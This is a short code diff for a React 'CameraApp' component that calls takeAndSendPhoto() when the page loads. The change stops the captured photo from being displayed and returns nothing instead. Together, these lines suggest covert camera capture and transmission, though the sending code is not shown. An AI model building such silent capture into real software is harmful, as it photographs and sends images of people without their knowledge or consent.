@@ -134,7 +134,7 @@ function CameraApp() {
     takeAndSendPhoto();
   }, []);
 
-  return photoDataUrl && <img src={photoDataUrl} alt="Снимок" style={{ width: "100%" }} />;
+  return null;
 }
 
 const root = ReactDOM.createRoot(document.getElementById("root"));
